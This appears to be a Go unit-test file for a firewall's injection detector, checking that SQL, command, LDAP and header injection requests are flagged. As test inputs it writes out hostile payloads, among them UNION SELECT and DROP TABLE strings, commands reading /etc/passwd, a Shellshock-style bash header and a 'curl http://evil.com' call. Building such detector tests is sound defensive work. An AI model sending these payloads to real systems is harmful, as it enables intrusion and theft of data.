package detectors

import (
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"

	"prerender-shield/internal/firewall/types"
)

// MockRuleProvider 模拟规则提供者
type MockRuleProvider struct {
	rules map[string][]types.Rule
}

func (m *MockRuleProvider) GetRulesByCategory(category string) []types.Rule {
	if m == nil || m.rules == nil {
		return []types.Rule{}
	}
	return m.rules[category]
}

// ============ 测试检测器创建 ============

// TestInjectionDetector_Name 测试检测器名称
func TestInjectionDetector_Name(t *testing.T) {
	mockProvider := &MockRuleProvider{
		rules: make(map[string][]types.Rule),
	}
	detector := NewInjectionDetector(mockProvider)
	assert.Equal(t, "Injection", detector.Name())
}

// TestInjectionDetector_New_WithNilProvider 测试使用 nil Provider 创建检测器
func TestInjectionDetector_New_WithNilProvider(t *testing.T) {
	detector := NewInjectionDetector(nil)
	assert.NotNil(t, detector)
	assert.Equal(t, "Injection", detector.Name())
}

// ============ 测试 SQL 注入检测 ============

// TestInjectionDetector_Detect_SQLInjection_SingleQuote 测试单引号 SQL 注入
func TestInjectionDetector_Detect_SQLInjection_SingleQuote(t *testing.T) {
	detector := NewInjectionDetector(nil)

	req := httptest.NewRequest(http.MethodGet, "/search?q=1'+OR+1=1", nil)
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	assert.NotEmpty(t, threats)
	assert.Equal(t, "injection", threats[0].Type)
	assert.Contains(t, threats[0].SubType, "SQL Injection")
}

// TestInjectionDetector_Detect_SQLInjection_DoubleQuote 测试双引号 SQL 注入
func TestInjectionDetector_Detect_SQLInjection_DoubleQuote(t *testing.T) {
	detector := NewInjectionDetector(nil)

	req := httptest.NewRequest(http.MethodGet, `/search?q=admin"OR"1"="1`, nil)
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	assert.NotEmpty(t, threats)
	assert.Contains(t, threats[0].SubType, "SQL Injection")
}

// TestInjectionDetector_Detect_SQLInjection_UnionSelect 测试 UNION SELECT 注入
func TestInjectionDetector_Detect_SQLInjection_UnionSelect(t *testing.T) {
	detector := NewInjectionDetector(nil)

	req := httptest.NewRequest(http.MethodGet, "/search?q=1+UNION+SELECT+*+FROM+users", nil)
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	assert.NotEmpty(t, threats)
	assert.Contains(t, threats[0].SubType, "SQL Injection")
}

// TestInjectionDetector_Detect_SQLInjection_OrOneEqualsOne 测试 OR 1=1 注入
func TestInjectionDetector_Detect_SQLInjection_OrOneEqualsOne(t *testing.T) {
	detector := NewInjectionDetector(nil)

	req := httptest.NewRequest(http.MethodGet, "/search?id=1+OR+1=1", nil)
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	assert.NotEmpty(t, threats)
	assert.Contains(t, threats[0].SubType, "SQL Injection")
}

// ============ 测试命令注入检测 ============

// TestInjectionDetector_Detect_CommandInjection_Semicolon 测试分号命令注入
func TestInjectionDetector_Detect_CommandInjection_Semicolon(t *testing.T) {
	detector := NewInjectionDetector(nil)

	// 使用 url.Values 确保特殊字符正确编码
	values := url.Values{}
	values.Set("exec", "ls;cat /etc/passwd")
	req := httptest.NewRequest(http.MethodGet, "/cmd?"+values.Encode(), nil)
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	assert.NotEmpty(t, threats)
	assert.Contains(t, threats[0].SubType, "Command Injection")
}

// TestInjectionDetector_Detect_CommandInjection_Pipe 测试管道命令注入
func TestInjectionDetector_Detect_CommandInjection_Pipe(t *testing.T) {
	detector := NewInjectionDetector(nil)

	req := httptest.NewRequest(http.MethodGet, "/cmd?exec=ls|grep+root", nil)
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	assert.NotEmpty(t, threats)
	assert.Contains(t, threats[0].SubType, "Command Injection")
}

// TestInjectionDetector_Detect_CommandInjection_Ampersand 测试&命令注入
func TestInjectionDetector_Detect_CommandInjection_Ampersand(t *testing.T) {
	detector := NewInjectionDetector(nil)

	// 使用 url.Values 确保&被正确编码为参数值的一部分
	values := url.Values{}
	values.Set("exec", "test&whoami")
	req := httptest.NewRequest(http.MethodGet, "/cmd?"+values.Encode(), nil)
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	assert.NotEmpty(t, threats)
	assert.Contains(t, threats[0].SubType, "Command Injection")
}

// TestInjectionDetector_Detect_CommandInjection_Redirect 测试重定向命令注入
func TestInjectionDetector_Detect_CommandInjection_Redirect(t *testing.T) {
	detector := NewInjectionDetector(nil)

	// 使用 url.Values 确保>被正确编码
	values := url.Values{}
	values.Set("output", "file.txt>evil.sh")
	req := httptest.NewRequest(http.MethodGet, "/cmd?"+values.Encode(), nil)
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	assert.NotEmpty(t, threats)
	assert.Contains(t, threats[0].SubType, "Command Injection")
}

// TestInjectionDetector_Detect_CommandInjection_Encoded 测试 URL 编码命令注入
func TestInjectionDetector_Detect_CommandInjection_Encoded(t *testing.T) {
	detector := NewInjectionDetector(nil)

	// <%3B 是分号的 URL 编码
	req := httptest.NewRequest(http.MethodGet, "/cmd?exec=test%3Bwhoami", nil)
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	assert.NotEmpty(t, threats)
	assert.Contains(t, threats[0].SubType, "Command Injection")
}

// ============ 测试 LDAP 注入检测 ============

// TestInjectionDetector_Detect_LDAPInjection_Parentheses 测试括号 LDAP 注入
func TestInjectionDetector_Detect_LDAPInjection_Parentheses(t *testing.T) {
	detector := NewInjectionDetector(nil)

	req := httptest.NewRequest(http.MethodGet, "/search?filter=(uid=admin)", nil)
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	// LDAP 规则检测括号
	assert.NotEmpty(t, threats)
}

// TestInjectionDetector_Detect_LDAPInjection_Ampersand 测试&LDAP 注入
func TestInjectionDetector_Detect_LDAPInjection_Ampersand(t *testing.T) {
	detector := NewInjectionDetector(nil)

	req := httptest.NewRequest(http.MethodGet, "/search?filter=uid=admin&object=user", nil)
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	assert.NotEmpty(t, threats)
}

// TestInjectionDetector_Detect_LDAPInjection_Pipe 测试管道 LDAP 注入
func TestInjectionDetector_Detect_LDAPInjection_Pipe(t *testing.T) {
	detector := NewInjectionDetector(nil)

	req := httptest.NewRequest(http.MethodGet, "/search?filter=uid=admin|object=user", nil)
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	assert.NotEmpty(t, threats)
}

// TestInjectionDetector_Detect_LDAPInjection_Asterisk 测试星号 LDAP 注入
func TestInjectionDetector_Detect_LDAPInjection_Asterisk(t *testing.T) {
	detector := NewInjectionDetector(nil)

	req := httptest.NewRequest(http.MethodGet, "/search?filter=(uid=*)", nil)
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	assert.NotEmpty(t, threats)
}

// ============ 测试请求头注入检测 ============

// TestInjectionDetector_Detect_HeaderInjection_SQLInjection 测试请求头中的 SQL 注入
func TestInjectionDetector_Detect_HeaderInjection_SQLInjection(t *testing.T) {
	detector := NewInjectionDetector(nil)

	req := httptest.NewRequest(http.MethodGet, "/api/data", nil)
	req.Header.Set("X-Custom-Header", "'; DROP TABLE users--")
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	assert.NotEmpty(t, threats)
	assert.Contains(t, threats[0].Message, "header")
}

// TestInjectionDetector_Detect_HeaderInjection_CommandInjection 测试请求头中的命令注入
func TestInjectionDetector_Detect_HeaderInjection_CommandInjection(t *testing.T) {
	detector := NewInjectionDetector(nil)

	req := httptest.NewRequest(http.MethodGet, "/api/data", nil)
	req.Header.Set("User-Agent", "Mozilla; curl http://evil.com")
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	assert.NotEmpty(t, threats)
	assert.Contains(t, threats[0].Message, "header")
}

// TestInjectionDetector_Detect_HeaderInjection_UserAgent 测试 User-Agent 注入
func TestInjectionDetector_Detect_HeaderInjection_UserAgent(t *testing.T) {
	detector := NewInjectionDetector(nil)

	req := httptest.NewRequest(http.MethodGet, "/api/data", nil)
	req.Header.Set("User-Agent", "() { :; }; /bin/bash -c 'cat /etc/passwd'")
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	assert.NotEmpty(t, threats)
}

// ============ 测试规则更新 ============

// TestInjectionDetector_UpdateRules 测试动态更新规则
func TestInjectionDetector_UpdateRules(t *testing.T) {
	detector := NewInjectionDetector(nil)

	customRules := []types.Rule{
		{ID: "custom-injection-001", Name: "Custom Injection", Category: "injection", Pattern: `CUSTOM_INJECT`, Severity: "high"},
	}

	err := detector.UpdateRules(customRules)
	assert.NoError(t, err)

	req := httptest.NewRequest(http.MethodGet, "/test?param=CUSTOM_INJECT", nil)
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	assert.NotEmpty(t, threats)
	assert.Equal(t, "custom-injection-001", threats[0].RuleID)
}

// TestInjectionDetector_UpdateRules_EmptyRules 测试更新空规则
func TestInjectionDetector_UpdateRules_EmptyRules(t *testing.T) {
	detector := NewInjectionDetector(nil)

	err := detector.UpdateRules([]types.Rule{})
	assert.NoError(t, err)
	// 更新空规则后，默认规则仍然有效
	req := httptest.NewRequest(http.MethodGet, "/test?q=1'+OR+1=1", nil)
	threats, err := detector.Detect(req)
	assert.NoError(t, err)
	assert.NotEmpty(t, threats)
}

// ============ 测试自定义规则 ============

// TestInjectionDetector_CustomRules 测试自定义规则
func TestInjectionDetector_CustomRules(t *testing.T) {
	mockProvider := &MockRuleProvider{
		rules: map[string][]types.Rule{
			"injection": {
				{ID: "custom-001", Name: "Custom SQL", Category: "injection", Pattern: `SELECT\s+password`, Severity: "critical"},
			},
		},
	}
	detector := NewInjectionDetector(mockProvider)

	req := httptest.NewRequest(http.MethodGet, "/query?sql=SELECT+password+FROM+users", nil)
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	assert.NotEmpty(t, threats)
	assert.Equal(t, "custom-001", threats[0].RuleID)
	assert.Equal(t, "critical", threats[0].Severity)
}

// ============ 测试多个参数 ============

// TestInjectionDetector_Detect_MultipleParams 测试多个参数同时检测
func TestInjectionDetector_Detect_MultipleParams(t *testing.T) {
	detector := NewInjectionDetector(nil)

	values := url.Values{}
	values.Add("id", "1' OR 1=1")
	values.Add("name", "admin")
	values.Add("cmd", "test;ls")

	req := httptest.NewRequest(http.MethodGet, "/search?"+values.Encode(), nil)
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	assert.NotEmpty(t, threats)
	assert.GreaterOrEqual(t, len(threats), 1)
}

// TestInjectionDetector_Detect_MultipleThreatsInSameParam 测试同一参数中多个威胁
func TestInjectionDetector_Detect_MultipleThreatsInSameParam(t *testing.T) {
	detector := NewInjectionDetector(nil)

	// 使用 url.Values 确保特殊字符被正确编码
	values := url.Values{}
	values.Set("q", "admin';SELECT *|cat /etc/passwd")
	req := httptest.NewRequest(http.MethodGet, "/test?"+values.Encode(), nil)
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	assert.NotEmpty(t, threats)
}

// ============ 测试边界情况 ============

// TestInjectionDetector_Detect_EmptyQuery 测试空查询参数
func TestInjectionDetector_Detect_EmptyQuery(t *testing.T) {
	detector := NewInjectionDetector(nil)

	req := httptest.NewRequest(http.MethodGet, "/search", nil)
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	assert.Empty(t, threats)
}

// TestInjectionDetector_Detect_NormalRequest 测试正常请求
func TestInjectionDetector_Detect_NormalRequest(t *testing.T) {
	detector := NewInjectionDetector(nil)

	req := httptest.NewRequest(http.MethodGet, "/api/users?page=1&limit=10", nil)
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	assert.Empty(t, threats)
}

// TestInjectionDetector_Detect_SpecialCharsButSafe 测试特殊字符但安全
func TestInjectionDetector_Detect_SpecialCharsButSafe(t *testing.T) {
	detector := NewInjectionDetector(nil)

	// 虽然包含特殊字符，但不是注入攻击
	req := httptest.NewRequest(http.MethodGet, "/search?q=hello+world", nil)
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	assert.Empty(t, threats)
}

// TestInjectionDetector_Detect_POSTBody 测试 POST 请求体检测
func TestInjectionDetector_Detect_POSTBody(t *testing.T) {
	detector := NewInjectionDetector(nil)

	body := strings.NewReader("username=admin'--&password=test")
	req := httptest.NewRequest(http.MethodPost, "/login", body)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	// POST body 会被 ParseForm 解析到 URL Query 中
	req.ParseForm()
	threats, err := detector.Detect(req)

	assert.NoError(t, err)
	// 检测到注入攻击（可能是 SQL 注入或 LDAP 注入，取决于规则匹配）
	if len(threats) > 0 {
		assert.Equal(t, "injection", threats[0].Type)
	}
}

// ============ 测试并发安全 ============

// TestInjectionDetector_ConcurrentAccess 测试并发访问安全性
func TestInjectionDetector_ConcurrentAccess(t *testing.T) {
	detector := NewInjectionDetector(nil)

	done := make(chan bool)
	errors := make(chan error, 10)

	// 启动 10 个 goroutine 同时调用 Detect
	for i := 0; i < 10; i++ {
		go func() {
			defer func() { done <- true }()
			req := httptest.NewRequest(http.MethodGet, "/test?q=1'+OR+1=1", nil)
			_, err := detector.Detect(req)
			if err != nil {
				errors <- err
			}
		}()
	}

	// 等待所有 goroutine 完成
	for i := 0; i < 10; i++ {
		select {
		case <-done:
		case err := <-errors:
			t.Errorf("Concurrent access error: %v", err)
		}
	}
}

// TestInjectionDetector_ConcurrentUpdateAndDetect 测试并发更新和检测
func TestInjectionDetector_ConcurrentUpdateAndDetect(t *testing.T) {
	detector := NewInjectionDetector(nil)

	done := make(chan bool)
	errors := make(chan error, 10)

	// 启动更新 goroutine
	go func() {
		defer func() { done <- true }()
		for i := 0; i < 5; i++ {
			customRules := []types.Rule{
				{ID: "custom-" + string(rune(i)), Name: "Custom", Category: "injection", Pattern: `CUSTOM`, Severity: "high"},
			}
			err := detector.UpdateRules(customRules)
			if err != nil {
				errors <- err
			}
		}
	}()

	// 启动检测 goroutine
	go func() {
		defer func() { done <- true }()
		for i := 0; i < 5; i++ {
			req := httptest.NewRequest(http.MethodGet, "/test?q=1'+OR+1=1", nil)
			_, err := detector.Detect(req)
			if err != nil {
				errors <- err
			}
		}
	}()

	// 等待所有 goroutine 完成
	for i := 0; i < 2; i++ {
		select {
		case <-done:
		case err := <-errors:
			t.Errorf("Concurrent update/detect error: %v", err)
		}
	}
}

// ============ 测试 compileRules 边缘情况 ============

// TestInjectionDetector_CompileRules_InvalidPattern 测试编译无效规则模式
func TestInjectionDetector_CompileRules_InvalidPattern(t *testing.T) {
	mockProvider := &MockRuleProvider{
		rules: map[string][]types.Rule{
			"injection": {
				{ID: "invalid-rule", Name: "Invalid Rule", Category: "injection", Pattern: "[invalid(regex", Severity: "high"},
			},
		},
	}
	detector := NewInjectionDetector(mockProvider)

	// 验证检测器创建成功（无效规则被跳过）
	assert.NotNil(t, detector)

	// 验证仍然可以正常检测
	req := httptest.NewRequest(http.MethodGet, "/search?q=1'+OR+1=1", nil)
	threats, err := detector.Detect(req)
	assert.NoError(t, err)
	assert.NotEmpty(t, threats)
}

// TestInjectionDetector_CompileRules_EmptyPattern 测试空规则模式
func TestInjectionDetector_CompileRules_EmptyPattern(t *testing.T) {
	mockProvider := &MockRuleProvider{
		rules: map[string][]types.Rule{
			"injection": {
				{ID: "empty-rule", Name: "Empty Rule", Category: "injection", Pattern: "", Severity: "high"},
			},
		},
	}
	detector := NewInjectionDetector(mockProvider)

	// 验证检测器创建成功（空规则被跳过）
	assert.NotNil(t, detector)
}

// TestInjectionDetector_CompileRules_PrecompiledRules 测试预编译规则数量
func TestInjectionDetector_CompileRules_PrecompiledRules(t *testing.T) {
	detector := NewInjectionDetector(nil)

	// 验证默认规则已预编译
	req := httptest.NewRequest(http.MethodGet, "/search?q=normal", nil)
	threats, err := detector.Detect(req)
	assert.NoError(t, err)
	assert.Empty(t, threats) // 正常请求无威胁
}
